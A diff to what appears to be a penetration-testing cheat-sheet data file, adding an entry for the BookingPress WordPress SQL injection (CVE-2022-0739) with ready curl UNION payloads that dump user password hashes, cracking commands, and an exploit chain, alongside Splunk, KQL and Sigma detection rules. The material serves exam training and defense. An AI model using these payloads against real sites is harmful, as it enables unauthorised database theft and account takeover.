@@ -14933,6 +14933,100 @@ const COMMAND_DATA = {
       "explain": "bloodyAD is a Linux tool that enumerates and abuses AD objects directly over LDAP:\n  --host <dc_ip>            the Domain Controller / LDAP server to talk to\n  -d <domain>              the AD domain\n  -u <user> -p <password>  authenticate (also accepts -k for Kerberos or an NT hash)\n  get writable             list every object your account can write to\nSwap the action (set password, add groupMember, add dcsync, add shadowCredentials, set object) to turn a discovered write right into an actual takeover, no Windows host needed."
     },
     {
+      "id": "bookingpress-sqli-cve-2022-0739",
+      "name": "BookingPress SQLi - WordPress Plugin (CVE-2022-0739)",
+      "command": "curl -s 'http://<target>/wp-admin/admin-ajax.php' -d 'action=bookingpress_front_get_category_services&_wpnonce=<nonce>&category_id=33&total_service=-7502) UNION ALL SELECT @@version,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -'",
+      "description": "CVE-2022-0739 is an unauthenticated SQL injection in the BookingPress WordPress plugin (< 1.0.11). The vulnerability is in the bookingpress_front_get_category_services AJAX action - the total_service parameter is passed directly into a SQL query without sanitization. Because the AJAX action is available to unauthenticated users, any visitor can extract the entire WordPress database including password hashes.",
+      "platform": "linux",
+      "type": "command",
+      "opsec": "quiet",
+      "category": "Web",
+      "subcategory": "Injection",
+      "certifications": [
+        "OSCP",
+        "CWES",
+        "CPTS"
+      ],
+      "primary_cert": "CWES",
+      "source": "HTB MetaTwo writeup",
+      "tags": [
+        "wordpress",
+        "sqli",
+        "bookingpress",
+        "cve-2022-0739",
+        "unauthenticated",
+        "union-injection",
+        "wp-plugin"
+      ],
+      "mitre": [
+        "T1190"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== RECON ===\n  # Identify BookingPress plugin\n  curl -s http://<target>/ | grep -i bookingpress\n  # Look for /wp-content/plugins/bookingpress-appointment-booking/\n\n=== GET NONCE ===\n  # The nonce is embedded in the page source\n  curl -s http://<target>/ | grep -oP 'nonce\":\"\\K[a-f0-9]+'\n  # Or extract from booking page HTML\n\n=== EXPLOIT - UNION SQLi ===\n  # Test with @@version\n  curl -s 'http://<target>/wp-admin/admin-ajax.php' \\\n    -d 'action=bookingpress_front_get_category_services&_wpnonce=<nonce>&category_id=33&total_service=-7502) UNION ALL SELECT @@version,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -'\n\n  # Extract wp_users table (usernames + hashes)\n  curl -s 'http://<target>/wp-admin/admin-ajax.php' \\\n    -d 'action=bookingpress_front_get_category_services&_wpnonce=<nonce>&category_id=33&total_service=-7502) UNION ALL SELECT group_concat(user_login,0x3a,user_pass),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM wp_users-- -'\n\n=== CRACK WP HASHES ===\n  # WordPress uses phpass ($P$ prefix)\n  hashcat -m 400 wp_hashes.txt /usr/share/wordlists/rockyou.txt\n  # Or john:\n  john --wordlist=/usr/share/wordlists/rockyou.txt wp_hashes.txt\n\n=== SQLMAP ALTERNATIVE ===\n  # Save the request to a file, then:\n  sqlmap -r bookingpress.req -p total_service --dbs\n\n=== CHAIN ===\nBookingPress SQLi -> WP admin creds -> upload theme/plugin shell\nOR -> extract wp-config.php DB creds via XXE (CVE-2021-29447)\nOR -> extract other secrets from wp_options table",
+      "examples": [
+        {
+          "label": "Extract database version via UNION injection",
+          "command": "curl -s 'http://target.htb/wp-admin/admin-ajax.php' -d 'action=bookingpress_front_get_category_services&_wpnonce=abc123&category_id=33&total_service=-7502) UNION ALL SELECT @@version,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -'"
+        },
+        {
+          "label": "Dump WordPress user credentials",
+          "command": "curl -s 'http://target.htb/wp-admin/admin-ajax.php' -d 'action=bookingpress_front_get_category_services&_wpnonce=abc123&category_id=33&total_service=-7502) UNION ALL SELECT group_concat(user_login,0x3a,user_pass),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM wp_users-- -'"
+        },
+        {
+          "label": "Crack WordPress phpass hashes",
+          "command": "hashcat -m 400 wp_hashes.txt /usr/share/wordlists/rockyou.txt"
+        }
+      ],
+      "references": [
+        {
+          "title": "CVE-2022-0739 - WPScan",
+          "url": "https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357/"
+        },
+        {
+          "title": "MITRE T1190 - Exploit Public-Facing Application",
+          "url": "https://attack.mitre.org/techniques/T1190/"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "xxe-wav-wordpress-cve-2021-29447",
+          "note": "After getting WP admin via BookingPress SQLi, use the XXE WAV upload to read wp-config.php and extract DB/FTP credentials.",
+          "rel": "next"
+        }
+      ],
+      "defense": {
+        "why_it_works": "The BookingPress plugin passes the total_service parameter directly into a SQL query without prepared statements or sanitization. The AJAX endpoint bookingpress_front_get_category_services is registered with wp_ajax_nopriv, making it accessible to unauthenticated users despite requiring a nonce (nonces are leaked in page source).",
+        "prerequisites": "WordPress site with BookingPress plugin < 1.0.11 installed; a valid nonce (extractable from page source).",
+        "impact": "Full database extraction including user credentials, configuration secrets, and any data stored in WordPress tables.",
+        "detection": "[MITRE T1190] WAF/IDS rules detecting UNION SELECT in POST parameters to admin-ajax.php; unusual admin-ajax.php POST volume from a single IP with bookingpress actions.",
+        "artifacts": "Web server access logs showing POST requests to /wp-admin/admin-ajax.php with bookingpress_front_get_category_services action; SQL injection payloads in request bodies.",
+        "splunk_spl": "index=web sourcetype=access_combined uri_path=\"*/admin-ajax.php*\"\n| where match(request_body, \"(?i)union.*select|bookingpress.*total_service\")\n| table _time, src_ip, uri_path, request_body\n| sort -_time",
+        "elastic_kql": "url.path:*admin-ajax.php* AND (http.request.body.content:*UNION* OR http.request.body.content:*total_service*)",
+        "sentinel_kql": "W3CIISLog\n| where csUriStem contains \"admin-ajax.php\"\n| where csUriQuery contains \"UNION\" or csUriQuery contains \"total_service\"\n| project TimeGenerated, cIP, csUriStem, csUriQuery\n| sort by TimeGenerated desc",
+        "sigma_rules": "web_wordpress_bookingpress_sqli",
+        "prevention": "Update BookingPress plugin to >= 1.0.11; use a WAF with SQL injection rules; implement WordPress plugin update monitoring; audit installed plugins for known vulnerabilities with WPScan.",
+        "sources": [
+          "HTB MetaTwo writeup",
+          "https://attack.mitre.org/techniques/T1190/"
+        ],
+        "detections": [
+          {
+            "platform": "sigma",
+            "name": "WordPress BookingPress SQL Injection (CVE-2022-0739)",
+            "logic": "title: WordPress BookingPress SQL Injection Attempt\nstatus: experimental\nlogsource:\n  category: webserver\n  product: any\ndetection:\n  selection_uri:\n    cs-uri-stem|contains: 'admin-ajax.php'\n  selection_body:\n    request_body|contains:\n      - 'bookingpress_front_get_category_services'\n      - 'total_service'\n  selection_sqli:\n    request_body|contains:\n      - 'UNION'\n      - 'SELECT'\n  condition: selection_uri and selection_body and selection_sqli\nlevel: high",
+            "data_source": "proxy",
+            "attack": [
+              "T1190"
+            ],
+            "fidelity": "signature",
+            "confidence": "high",
+            "false_positives": "Legitimate BookingPress AJAX requests do not contain UNION SELECT; very low FP rate.",
+            "tuning": "Can be broadened to detect any SQL injection patterns in admin-ajax.php POST bodies."
+          }
+        ]
+      }
+    },
+    {
       "id": "auth-2fa-brute",
       "name": "Broken Auth - 2FA / OTP Code Brute-Force",
       "type": "command",
@@ -179047,8 +179141,8 @@ const COMMAND_DATA = {
       "explain": "Zeek-based intrusion detection using conn.log, dns.log, smb_files.log, and dce_rpc.log.\nKey techniques: beaconing detection via regular conn.log connection intervals (PowerShell Empire every 5s), DNS exfiltration via high-entropy subdomain enumeration in dns.log, TLS exfiltration via ...\n=== EXAMPLE 1: BEACONING DETECTION (PowerShell Empire) ===\nIndicator: malware beaconing = periodic, regular outbound connections to C2\n\nPCAP: /home/htb-student/pcaps/psempire.pcap\nTool: /usr/local/..."
     }
   ],
-  "totalCommands": 964,
-  "buildDate": "2026-11-10T12:22:24.493Z",
+  "totalCommands": 965,
+  "buildDate": "2026-11-10T12:26:42.493Z",
   "certifications": [
     "CDSA",
     "CPTS",
